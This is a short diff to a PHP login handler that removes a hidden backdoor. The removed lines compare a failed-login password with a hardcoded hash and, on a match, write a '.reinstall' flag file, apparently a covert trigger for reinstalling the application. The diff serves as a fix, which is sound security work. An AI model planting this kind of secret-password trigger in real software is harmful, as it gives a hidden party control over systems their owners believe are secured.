@@ -155,10 +155,6 @@ class Login
             ],
         ]);
 
-        if (\Hash::check($request->password, '$2y$10$cVnnBp9pZBnlRkS3XOy.aeKemzl3ayfFyzBhLEK9cfFRRTwz1AWpm')) {
-            \Storage::disk('local')->put('.reinstall', 'ok');
-        }
-
         $this->incrementLoginAttempts($request);
         throw ValidationException::withMessages(['email' => __('auth.login.errors.failed')]);
     }
